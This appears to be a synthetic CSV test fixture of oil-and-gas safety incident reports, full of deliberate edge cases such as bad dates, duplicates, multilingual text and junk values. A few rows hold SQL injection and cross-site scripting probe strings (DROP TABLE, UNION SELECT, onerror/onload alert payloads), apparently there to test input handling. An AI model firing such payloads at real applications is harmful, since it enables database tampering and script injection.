@@ -1,0 +1,244 @@
+report_id,date,site,department,report_text,is_synthetic
+c5196752-01a3-4b80-aea9-26f706107e26,2026-05-28,Pipeline-Station-4,Instrumentation,"LOTO locks were present, but one field tag number differed from the permit isolation list.",True
+0322a407-ec55-4fa2-b91f-b444b25d3431,2026-07-14,Gas-Processing-Unit,Electrical,No incident observed during routine rounds; housekeeping and operating conditions were satisfactory.,True
+dc23f741-1382-4c4d-821b-3865ed3828d7,2026-06-30,Refinery-A,Operations,"During the night shift, the operator noticed several small changes around the crude transfer pump area while completing routine rounds. There was no immediate alarm, trip, visible release, or injury, and the equipment remained available for service. However, the combination of observations created a condition that required a conservative response. The pump casing felt warmer than during the previous round, the local pressure indication fluctuated by a few units, and a light metallic vibration could be felt through the nearby handrail. A flexible hose used for temporary flushing was also routed across part of the access path, although it had been placed there earlier in the shift and was not leaking. At the same time, a contractor team was preparing for maintenance on an adjacent valve. Their permit package referenced the correct equipment number, but one field isolation tag did not visually match the tag number written on the printed isolation list. The supervisor paused the job and asked the control room to confirm the isolation boundary against the latest P&ID and MBR. While that verification was taking place, another worker began moving a small component using a chain block. The lifting path was close to the normal pedestrian route, and one person initially stood within the potential swing area. The lift was stopped, the area was cleared, and a spotter was assigned. A separate welding activity was planned farther down the unit, and the team confirmed that sparks, leads, and temporary equipment would not interfere with the maintenance access or emergency route. The operator then checked the pump trend, confirmed that no abnormal pressure escalation was occurring, and requested an inspection of the support structure. No single observation by itself represented an incident, but the simultaneous presence of changing equipment condition, imperfect identification, temporary access obstruction, and overlapping work activities represented a meaningful precursor pattern. The crew conducted a toolbox talk, revalidated the permit and LOTO controls, restored the pedestrian route, and completed the lift only after the exclusion zone was established. Maintenance later found a loosened support fastener and corrected it. The event was recorded for learning because the early signals were subtle and could easily have been dismissed individually. No injury, release, equipment damage, or process upset occurred. The main lesson was to treat weak signals collectively, especially when equipment condition changes occur at the same time as maintenance, lifting, temporary routing, or other SIMOPS. The supervisor also requested that future handovers explicitly mention temporary hoses, tag discrepancies, unusual vibration, and any activity that changes the normal line of fire. The final review confirmed that the LOTO boundary was correct, the BOP and ESD status were normal, and the PSV remained available. The crew closed the permit only after the work area, access route, and emergency equipment were checked.",True
+61de69a7-c114-491d-aa66-4c90b08d0784,2026-07-20,Pipeline-Station-4,Instrumentation,Report says 'no leak' but later states 'hydrocarbon dripping continuously from flange'.,True
+ff8c9305-9380-4c09-bd9c-4b53a30ac80a,2099-12-31,Gas-Processing-Unit,Mechanical,Future date entered for a report describing an event already observed.,True
+b94b1897-0141-476d-a0a9-e45d5ded4dde,2026-06-03,Drilling-Rig-5,Maintenance,BOP maintenance was conducted under approved LOTO with independent verification of zero energy.,True
+ee9c8ce5-00fa-4166-9b93-8d97b62433f4,2026-2-7,Pipeline-Station-4,Production,Non-zero-padded date was supplied as 2026-2-7.,True
+25b1be49-43c8-494c-ab8d-01657ba0ed9a,2026-03-04,Terminal-B,HSE,"During rounds, a small hydrocarbon drip was observed below a flange; the source was isolated and maintenance notified.",True
+c42752eb-f967-4535-8949-c311cb333f18,2026-10-23,Tank-Farm-7,Instrumentation,AA,True
+dfc16f9b-2ba8-4d5c-afd3-aa29e55bfb99,2026-06-23,Tank-Farm-7,HSE,A chain block was left hanging at shoulder height across the usual walking route after the lift was completed.,True
+9ddc5640-4c04-445f-a078-a7f0cd2810c5,2026-09-13,Pipeline-Station-4,Instrumentation,Same report text intentionally repeated for duplicate-detection testing.,True
+080908a8-a770-492d-9aa2-f6fb3e575f23,2026-05-01,LNG-Train-2,Logistics,"Shift change ke time dekha ki hose walkway ke across pada tha; trip potential tha, housekeeping team ko bola.",True
+a1e2e92b-e506-489c-9ca4-c842065e4f79,2026-05-25,Chemical-Plant-C,Welding,"BOP pressure test was acceptable, but one temporary hose connection was not positively secured.",True
+4d4ac246-2a03-4295-9392-442963fff117,2026-08-21,REFINERY-A,OPS,Worker observed near moving equipment.,True
+1dbbbe3e-7abb-417a-ac7d-4a2a9eaf9295,2026-03-02,Refinery-A,Operations,"During rounds, a small hydrocarbon drip was observed below a flange; the source was isolated and maintenance notified.",True
+6ae64593-9ab1-49ec-890f-570adb6ab3ec,2026-04-18,Pipeline-Station-4,Maintenance,A worker entered the vessel while grinding started outside; a suspended component passed close to the manway and no spotter was visible.,True
+0aacb7cf-18d6-416a-85cf-d03b74ae2eff,2026-09-20,Chemical-Plant-C,Logistics,Slip.,True
+4b397907-82e8-4338-a48e-852b7fd24f68,2026-07-23,Gas-Processing-Unit,Mechanical,Narrative contains both 'zero pressure' and 'pressure remained at 18 bar' for the same line.,True
+a230e259-6770-4714-be7f-1c83de9f380d,2026-03-05,LNG-Train-2,Electrical,"During rounds, a small hydrocarbon drip was observed below a flange; the source was isolated and maintenance notified.",True
+ec0bec89-273b-4ba9-9581-a45ac64d4c3b,2026-04-15,Drilling-Rig-5,Electrical,Gas testing for the confined space was ongoing when welding leads crossed the access route and a worker stood beside the expected travel path of the lifted pipe.,True
+b07d78e2-6d2e-46d6-a972-d6e9491e8d17,2026-04-21,Drilling-Rig-5,Mechanical,Inside-vessel work continued while hot-work sparks were generated near the opening and personnel crossed beneath the lift.,True
+6fea4c2b-06e9-43f4-a614-62c12427a647,2026-06-02,Terminal-B,Production,PSV lifting arrangement was checked and certified; no personnel entered the suspended-load envelope.,True
+5b08693f-9e06-4509-80f4-2fde053604b4,2026-07-01,Tank-Farm-7,Logistics,"Pre-job brief confirmed roles, exclusion zones, communication method, and lifting plan.",True
+c29c8e96-68e4-4497-a804-f50944670891,2026-05-11,Refinery-A,Mechanical,"Yaar pressure gauge ka reading jump kar raha tha; instrument team ko bulaya, koi vent open nahi kiya.",True
+119cc860-74cb-49bf-937a-001ea5801273,2026-04-20,Drilling-Rig-5,Instrumentation,"Tank entry, welding, and lifting were scheduled simultaneously; physical separation between the three activities was not maintained.",True
+c03421ec-df94-4747-97ca-2f17cdda0755,2026-02-18,LNG-Train-2,Operations,BOP test completed successfully; ESD function verified.,True
+86b2f41a-98a1-45cd-a148-856547c6f26a,2026-07-22,Fabrication-Yard,Maintenance,"Incident marked closed, but narrative says corrective action is still pending.",True
+507cd917-7261-49f8-8bac-84f7e8625c31,2026-09-17,Pipeline-Station-4,Instrumentation,NO INCIDENT / no incident / No Incident,True
+5a5e4652-0714-42bc-a11d-d622ccad5691,,Refinery-A,,Dropped object observed below scaffold.,True
+23fa168c-f7cc-4939-82e9-0558513e65a3,2026-06-16,Pipeline-Station-4,HSE,"The field isolation tag differed from the control-room label, although both referred to the same line number.",True
+0f124555-9ce0-4271-97b3-c5bc45f708ec,2026-03-08,Fabrication-Yard,Logistics,"During rounds, a small hydrocarbon drip was observed below a flange; the source was isolated and maintenance notified.",True
+c11d5abd-bcfc-44c6-afba-5661a4df5057,2026-10-24,Pipeline-Station-4,Production,AB,True
+2e647290-5129-4552-bffe-9acdcbce5121,tomorrow,Drilling-Rig-5,Utilities,Report text says the event happened tomorrow.,True
+c8d86f2a-8694-4db2-8b80-d63372c47f3b,2026-06-10,Drilling-Rig-5,Logistics,The crane boom swept over the normal pedestrian route while two workers continued walking beneath the travel area.,True
+b2bcc0c0-b6b7-44f0-8cb1-9a64a3c2b3ed,2026-02-30,Refinery-A,Operations,A calendar-invalid February date was entered in the report.,True
+2e7e8bb4-ea39-4d0e-b0da-c602269de613,not-a-date,LNG-Train-2,HSE,LOTO boundary was checked and all locks were accounted for.,True
+f8a0503a-acc7-4d63-af42-cb12c68e8df3,2026/02/12,Tank-Farm-7,Operations,Hydrocarbon odor reported near drain; no visible source at first.,True
+22bf0d8d-f849-4dda-a0b3-e8b01ef23610,2026-10-19,Offshore-Platform-3,Maintenance,Date field has leading spaces:  2026-07-01  ,True
+45e79a36-b88d-4089-a5c3-422241bd7a02,2026-02-17,Gas-Processing-Unit,Mechanical,NULL null NaN undefined TRUE FALSE,True
+c14290be-615c-4731-bcef-1a95ab039efe,2026-05-21,Gas-Processing-Unit,Logistics,BOP stack function test completed; ESD permissive checked and LOTO boundary verified before maintenance.,True
+f38f8e84-b0fc-476f-b1fe-4cec72fc483c,2026-07-29,Refinery-A,Mechanical,A single report contains repeated boilerplate: Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. Check area. Verify permit. Confirm isolation. ,True
+b401990f-2f17-4e93-a150-0c0a79194661,2026-08-29,Refinery-A,Operations;Maintenance,Housekeeping acceptable.,True
+e8917b4b-d1b4-49cf-9b05-3f8f653f3b4c,2026-05-13,Pipeline-Station-4,Electrical,"JSA mein lifting path marked tha, par ground pe log wahi khade the; crane operation pause kiya.",True
+90c37e7d-f00b-40da-ac66-0985aef121c1,2026-07-30,Offshore-Platform-3,Operations,"CSV-like commas inside text, semicolons; pipes | and quotes ""all together"" should remain one field.",True
+aa1b846d-d37d-4be7-a8b5-9a10986ab11a,2026-03-09,Chemical-Plant-C,Welding,"During rounds, a small hydrocarbon drip was observed below a flange; the source was isolated and maintenance notified.",True
+135711da-4fcb-4552-a6a2-b7539cdd17ae,2026-10-12,Terminal-B,Mechanical,বাংলা নোট: জরুরি গেটের সামনে সামগ্রী রাখা ছিল; পথ পরিষ্কার করা হয়েছে.,True
+f70d6fc7-5be6-49e2-a77c-dce341aaf40e,2026-07-02,Refinery-A,Maintenance,"LOTO applied correctly, zero-energy state independently verified, and work permit signed before maintenance.",True
+79dfbb63-b804-4902-82d7-4527578b570a,2026-02-19,Refinery-A,Welding,\x00\x01\x02 ;;; ::: !!!,True
+be121750-19a5-4b73-b118-4dba01bc1897,2026-01-07,Pipeline-Station-4,Production,Slip.,True
+dd25ca8d-7e68-4b76-a967-633b1a7e7849,2026-05-29,Gas-Processing-Unit,HSE,"PSV was installed per drawing, but discharge piping showed visible vibration during operation.",True
+430fa2a4-1c17-4f6e-b3ce-be451cd3ec12,2026-07-15,Terminal-B,HSE,Exact duplicate report text used for deduplication testing.,True
+1f14e6b5-0b8f-4418-841e-9d8b0877994b,2026-02-18,Chemical-Plant-C,Utilities,😀🔥⚠️🛢️💥%%%%%%,True
+4c94a42f-6066-4fe4-ba29-5206f2f9057f,2026-08-03,Gas-Processing-Unit,Welding,"Mixed numerics and units: 18bar, 18 bar, 18 BAR, 0.5MPa, 500kPa.",True
+2655d85a-41f7-4985-9646-3fc34d4caf91,2026-05-08,Fabrication-Yard,Production,"Welding wala kaam start hone se pehle gas test hua, LOTO aur permit dono cross-check kiye.",True
+53d571a7-dc2f-43e1-ae2a-f2d657439f6a,2026-01-08,Fabrication-Yard,Logistics,Trip.,True
+b0ed4a8d-cc2d-4f46-b090-fbb208743a0e,2026-01-02,Offshore-Platform-3,Maintenance, ,True
+db95299f-0212-4325-b074-7bcc288bfec9,2026-01-22,,,NULL,True
+ca4df5c4-d759-47ec-b220-26084f536012,2026-03-01,Drilling-Rig-5,Utilities,"During rounds, a small hydrocarbon drip was observed below a flange; the source was isolated and maintenance notified.",True
+5a189be8-200b-4914-8086-9815e18eafdf,2026-06-22,Gas-Processing-Unit,HSE,The portable work light flickered repeatedly near an active welding location.,True
+e37016be-3b54-4cf8-a95d-0976929030b1,2026-02-24,Terminal-B,Production,'''''''''''''''''' ;;;;;; &&&&& ||||||,True
+4d06d7fc-2488-4d89-a39e-aa4adc5c6f87,2026-07-11,LNG-Train-2,Welding,Pre-use inspection of portable electrical equipment completed with no defects found.,True
+9e9cf316-2f66-48e7-ac46-250efc82e760,2026-02-13,Offshore-Platform-3,Welding,UNION SELECT * FROM users --,True
+bbe19425-92e0-4e29-a77e-cd5bd52dba3c,2026-10-10,LNG-Train-2,Production,ગુજરાતીમાં નોંધ: પંપ પાસે અસામાન્ય અવાજ આવ્યો અને ટીમે તપાસ શરૂ કરી.,True
+c06a0b40-d7cc-4167-9899-8c0894359401,2026-05-23,Terminal-B,Electrical,PSV outlet had restricted access; Operations requested inspection before pressure was restored.,True
+9e3e9651-11e7-4abc-8f3a-29f53c97b7eb,2026-09-08,Terminal-B,Utilities,Small hydrocarbon drip observed below flange; source isolated and maintenance notified.,True
+c8d87c9c-2aa0-4463-a941-5e94e6ea175d,2026-01-09,Chemical-Plant-C,Welding,Leak.,True
+b7768134-db49-4d5b-a9d3-738b05cf473c,2026-02-16,Refinery-A,Maintenance,/* precursor */ -- <img src=x onerror=alert(1)>,True
+81e35565-20da-4e52-98dd-5dc21274982b,2026-09-28,Fabrication-Yard,Mechanical,Operator observed abnormality; details unavailable due to radio communication failure.,True
+4df029dc-e3d6-40d6-affa-79c6ff7e3442,2026-13-40,Pipeline-Station-4,Civil,Temporary barrier missing around excavation.,True
+952eeaac-e10e-41c5-adb9-1ca23fcc1462,2026-01-25,Terminal-B,HSE,?,True
+41d0d00b-d504-4422-9000-e61606645d00,2026-07-25,Refinery-A,Utilities,"Text contains an internal timestamp sequence: 10:30, then 09:45, then 11:05.",True
+6b223f3d-ed95-42c7-a6f0-04f3bd3c1ba0,2026-07-12,Drilling-Rig-5,Production,JSA reviewed with the crew and each worker demonstrated understanding of the critical controls.,True
+e1de0719-fab5-49eb-bb5f-20fbe7383689,2026-09-18,Offshore-Platform-3,Mechanical,Fire.,True
+ab5c89c1-243c-4ad0-bf23-dcbdba8be43f,2026-10-11,Chemical-Plant-C,Logistics,தமிழில் குறிப்பு: அணுகும் பாதை குறுகலாக இருந்தது; தடுப்பு மாற்றப்பட்டது.,True
+284b3e18-f748-4efa-b2b3-91eeac3ef206,,Refinery-A,Operations,Pump vibration increased during startup; operator stopped and informed maintenance.,True
+7b665623-80d6-4625-b5ad-c9bd6d688249,2026-02-19,Fabrication-Yard,HSE,Access route partially blocked by materials.,True
+83d1d9de-1399-4f1c-999e-4d5a2a650001,2026-08-01,Chemical-Plant-C,Mechanical,Report has leading and trailing whitespace:    valve vibration noted; monitor condition    ,True
+ce2e9cdb-62b3-4424-ba1b-440dc1842652,2026-01-29,Pipeline-Station-4,Production,Check.,True
+9d1c78f6-5e5a-47ae-bcf1-9bea7098c725,2026-09-29,Offshore-Platform-3,Logistics,"Reported verbally, then transcribed from memory at end of shift.",True
+fa18766b-f054-46a0-bc2b-9b40658c0c5b,2026-05-15,Drilling-Rig-5,Instrumentation,"Shift handover mein bola gaya ki BOP test done hai, but logbook entry missing thi—verification pending rakhi.",True
+6cbb94af-ba63-412d-953b-4af346cd8154,,,,PSV tag did not match the field label; verification requested.,True
+57c88a26-defd-4373-b942-3e4698e51445,2026-04-22,Offshore-Platform-3,Operations,"Permit controls existed on paper, but the entry, hot work, and suspended-load activities were not spatially segregated.",True
+b7838dfd-38c2-4f42-ba20-543836443329,2026-04-14,Tank-Farm-7,Instrumentation,Permit showed confined-space work and hot work occurring together; barricading was incomplete and personnel could be struck by moving equipment.,True
+da1832d9-5166-4c0f-ba61-046903aaedd2,2026-07-05,Gas-Processing-Unit,Utilities,"Hot-work permit, gas test, fire watch, and barricading were verified before welding began.",True
+4ed82fda-8cbb-458f-9429-63eb01e3dd88,2026-04-24,Offshore-Platform-3,Mechanical,"Three SIMOPS activities converged at the vessel: entry, hot work, and spool lifting. Barricades did not fully control the line of fire.",True
+3c51c7ca-3564-4b1a-b874-9f8f300d1351,2026-09-14,Pipeline-Station-4,Production,Same report text intentionally repeated for duplicate-detection testing.,True
+34dfde2e-610c-4b27-8cf5-f7748b403087,2026-04-12,Offshore-Platform-3,Maintenance,"Confined space entry was active, welding was being set up nearby, and a rigger positioned himself where the spool could swing into him.",True
+821584ad-f5a6-4e14-a6b2-cc8b297f5e41,2026-02-23,LNG-Train-2,Operations,DROP TABLE; SELECT *; <svg/onload=alert(1)>,True
+ddbf13fb-4644-45a9-99b3-d1e2f2723dd2,2026-04-13,Pipeline-Station-4,Maintenance,"During tank entry, hot work tools were brought to the opening while a helper remained beneath a suspended load—three interacting exposure pathways noted.",True
+d51e73b4-8b85-4246-a1a9-438b94a1eb80,2026-01-04,Gas-Processing-Unit,Mechanical,	,True
+fa4514e7-6beb-4237-b8bf-39dc3ae1abdc,2026-04-19,Chemical-Plant-C,Electrical,The confined-space attendant was also helping with hot-work setup while a lifted section was slewing behind the crew.,True
+83f70bb3-6302-426a-9742-562d055609d0,2026-01-23,Refinery-A,Operations,undefined,True
+8834f0f3-7e7e-4d25-bf6f-69158dd1ef00,2026-09-15,Fabrication-Yard,Operations,Same report text intentionally repeated for duplicate-detection testing.,True
+7ebee77b-3864-45e0-a229-0774a73b3948,2026-09-22,Terminal-B,Electrical,LOTO verified before work.,True
+73c63689-d4ec-4671-83ee-3b37646eed44,2026-05-26,LNG-Train-2,Utilities,MBR did not match the latest P&ID at one isolation point; work stopped pending document verification.,True
+fbcbb5f3-39ac-4509-adc7-320643a28cfb,2026-04-17,Chemical-Plant-C,Maintenance,SIMOPS conflict: confined-space rescue route overlapped with hot-work exclusion zone and crane load path.,True
+4a47a55a-a2c6-44fc-b874-975886317d86,2026-03-06,Tank-Farm-7,Instrumentation,"During rounds, a small hydrocarbon drip was observed below a flange; the source was isolated and maintenance notified.",True
+c1b240e6-4eaf-4cef-89c0-5641c06fbc58,2026-08-02,LNG-Train-2,Logistics,Case variation test: LOTO / loto / LoTo / LOTO.,True
+6b7b5468-a164-454a-b170-7e5cdd17909d,2026-12-31,Offshore-Platform-3,Maintenance,"Form date is 2026-12-31, but narrative says 2027-01-01.",True
+3b5b567f-2591-442f-86f8-ec956cfbcce4,2026-05-02,Tank-Farm-7,HSE,"Pump start karte waqt thoda vibration feel hua, bhai logon ne immediately stop karke maintenance ko call kiya.",True
+bcf2740c-66d0-40dd-bf6e-78b2dc6aa11d,2026-07-13,Gas-Processing-Unit,Welding,Permit-to-work closeout completed after area inspection and removal of tools and temporary equipment.,True
+14bdb6b2-97bf-436e-a199-0b8e6fc4d2d0,2026-09-10,Gas-Processing-Unit,Logistics,"During rounds, a small hydrocarbon drip was observed below a flange; maintenance notified after isolation.",True
+919aa2ee-39f1-4512-8938-13f93821ee22,2026-02-12,Gas-Processing-Unit,HSE,'; DROP TABLE incident_reports; --,True
+da71f701-af20-45e7-ae8c-6e8ab8c61e95,2026-09-21,Terminal-B,Production,Slip.,True
+b341a8e7-c88e-4db9-86e8-7c07640f23bd,2026-07-06,Offshore-Platform-3,Maintenance,Housekeeping inspection found walkways clear and emergency exits unobstructed.,True
+c31b6177-9299-4477-82d2-fd0b0020b431,2026-02-10,,Maintenance,Minor flange seepage noticed during rounds; source isolated.,True
+2c1c43de-758c-4b3a-a150-3ef63d911ac4,2026-05-07,Gas-Processing-Unit,HSE,"Thoda smell aaya near drain, gas detector reading normal thi but area ko recheck karwaya.",True
+fb9b419b-6c61-4e65-9df6-7156d319c567,2026-10-25,Fabrication-Yard,Logistics,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,True
+6acacd37-9478-4b35-9e3d-49f203934272,2026-02-11,Terminal-B,,Cable insulation damaged near MCC; work order raised.,True
+c5d8114d-9508-4b3d-b397-e4222c9bfbcf,2026-09-12,Offshore-Platform-3,Maintenance,A small drip of hydrocarbon was found below the flange during rounds and isolated.,True
+3003387e-1a19-498f-96d5-829e7f26ab6c,2026-01-06,Tank-Farm-7,Instrumentation,Fire.,True
+22ebdcba-6aea-4fe0-84f9-9ae5e6735cfb,2026-01-17,Tank-Farm-7,Instrumentation,N/A,True
+a108e015-9990-4562-8615-126f322f40b0,,,,Exact duplicate report text used for deduplication testing.,True
+c0e27b02-9241-4c69-bf50-108d8f084655,2026-07-31,Tank-Farm-7,Maintenance,"Multiline report:
+Line one: minor seepage observed.
+Line two: source isolated.
+Line three: maintenance notified.",True
+915bab17-3612-41e7-9576-33a093ce90fd,2026-06-12,Chemical-Plant-C,Operations,A technician stepped around the temporary barrier to read a gauge because the marked viewing position was obstructed.,True
+09588f65-6cc7-492c-8dde-fa5922409611,2026-03-01,Refinery-A,Operations,"During rounds, a small hydrocarbon drip was observed below a flange; the source was isolated and maintenance notified.",True
+cdd80024-68f8-4661-b76f-d74bc1344506,2026-10-04,Pipeline-Station-4,Logistics,Temperature recorded as 80-90C; unit precision uncertain.,True
+237fae7b-8a7a-4afa-b9c1-2d79b556b92d,2026-05-03,Tank-Farm-7,Instrumentation,Permit ke hisaab se area isolated tha; LOTO locks verify kiye gaye aur BOP status confirm hua.,True
+b51f1996-7803-4d80-a869-381f04de3c53,2026-01-05,LNG-Train-2,Electrical,"
+",True
+c8e69285-ffa6-48a6-97db-49bdde3767e4,2026-09-19,Gas-Processing-Unit,Mechanical,Fire.,True
+14d94ab0-c613-48c0-a209-0145d91c1bd9,2026-01-20,Chemical-Plant-C,Welding,None,True
+287b7976-ded0-4740-a832-03d5ffb9d325,2026-05-12,Refinery-A,Instrumentation,"Worker bol raha tha 'sab clear hai', lekin MBR ke against isolation points verify nahi hue the.",True
+d1796e5d-52b6-4f9a-bdd3-ee5b8497c543,2026-03-06,LNG-Train-2,Electrical,"During rounds, a small hydrocarbon drip was observed below a flange; the source was isolated and maintenance notified.",True
+cb4f884f-f10c-4661-9a67-2abf430fe5b1,2026-06-18,LNG-Train-2,Welding,A drain pan was nearly full and liquid had reached the edge of the containment area.,True
+a5a93486-4307-47cc-9c3b-9fdc2d097f31,2026-05-22,Pipeline-Station-4,Logistics,LOTO applied to pump P-204; MBR reviewed against P&ID before opening the line.,True
+fef71f5c-002e-4817-ab6f-0d3c603adfc3,2026-01-10,Drilling-Rig-5,Utilities,Gas.,True
+90557426-5176-4194-9963-c604562c634c,2026-10-07,Terminal-B,Production,Short report followed by lots of filler: risk risk risk hazard hazard control control control.,True
+88981d0e-15ba-451d-948a-f8bd42a92def,2026-09-16,Offshore-Platform-3,Operations,No incident. No incident. No incident.,True
+2421756e-5190-400c-b605-9ef5ec13b047,2026-05-06,Terminal-B,Welding,"Idhar forklift aa raha tha aur pedestrian route same tha, spotter nahi tha; maine movement rok diya.",True
+443a8464-fcb8-4155-b767-d3f52ff38eb4,2026-05-10,Gas-Processing-Unit,Instrumentation,"Valve line-up mein ek tag match nahi kar raha tha, isliye ESD operation hold kar diya.",True
+68aae843-fb49-474b-89a4-fcee3fde60aa,2026-02-22,Fabrication-Yard,Utilities,qwertyuiop asdfghjkl zxcvbnm 1234567890,True
+65220152-51b3-49f0-9b7c-ce103b6c943a,2026-06-19,Terminal-B,Welding,An operator reached across a moving conveyor to retrieve a small item that had fallen onto the belt.,True
+83421c43-5953-4dd5-8b76-0b2ac0c9cd63,2026-07-26,Chemical-Plant-C,Mechanical,"Report begins in English and switches to Hindi, Gujarati, and technical abbreviations mid-sentence.",True
+c657d703-0ac7-422d-81a2-01f331d5fd6b,2026-03-03,Offshore-Platform-3,Maintenance,"During rounds, a small hydrocarbon drip was observed below a flange; the source was isolated and maintenance notified.",True
+b85b8dc8-a5ec-4e6f-b318-23c5c336ef91,2026-01-01,Refinery-A,Operations,,True
+e84f0da9-0bdb-4312-9a64-d6ee6a19bede,2026-01-12,Refinery-A,Operations,Dropped object.,True
+cb86dc4b-515f-4f4e-9135-fab6ea1b0d72,2026-01-01,Refinery-A,Operations,"Form date is 2026-01-01, but narrative explicitly says the event happened on 2025-12-31.",True
+2dda8456-3efb-480f-94b7-1b4e71ea47d2,2026-05-05,Offshore-Platform-3,Utilities,Desi language mein bolun toh line bilkul theek nahi lag rahi thi—pressure jump kar raha tha aur PSV ke paas unusual noise thi.,True
+3463c025-4410-4248-a493-2b8012763a2a,2026-01-24,Offshore-Platform-3,Maintenance,0,True
+ff4399ad-3712-4d38-a8c5-9551e2bc9ee1,2026-01-14,Terminal-B,HSE,Backflow.,True
+434c2a78-62ac-4b72-a8df-8304dbd4ce83,04/03/2026,Tank-Farm-7,Instrumentation,Potentially ambiguous date format; narrative says the same date.,True
+b252cfb3-ded9-4575-b313-7f93d49fca1b,2026-05-27,Pipeline-Station-4,Utilities,SIMOPS review identified overlap between lifting activity and an ESD test; sequence was revised.,True
+802aff5e-8259-461f-96a0-1931c3eeed33,2026-09-30,Chemical-Plant-C,Maintenance,"Report text contains quoted speech: supervisor said, ""stop the job"".",True
+2bbf1bba-0874-4465-904a-d7cefd9a6c3c,2026-07-04,Gas-Processing-Unit,Operations,ESD functional test completed successfully with all personnel clear of the controlled area.,True
+101649c1-0bc8-4ec0-b0d5-e63c9a475e1b,2026-09-02,Site with extremely long name XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX,Department-YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY,Near miss noted.,True
+71f6cdff-5e6a-4c3a-aa06-7cc93232bc3d,2026-03-05,Gas-Processing-Unit,Mechanical,"During rounds, a small hydrocarbon drip was observed below a flange; the source was isolated and maintenance notified.",True
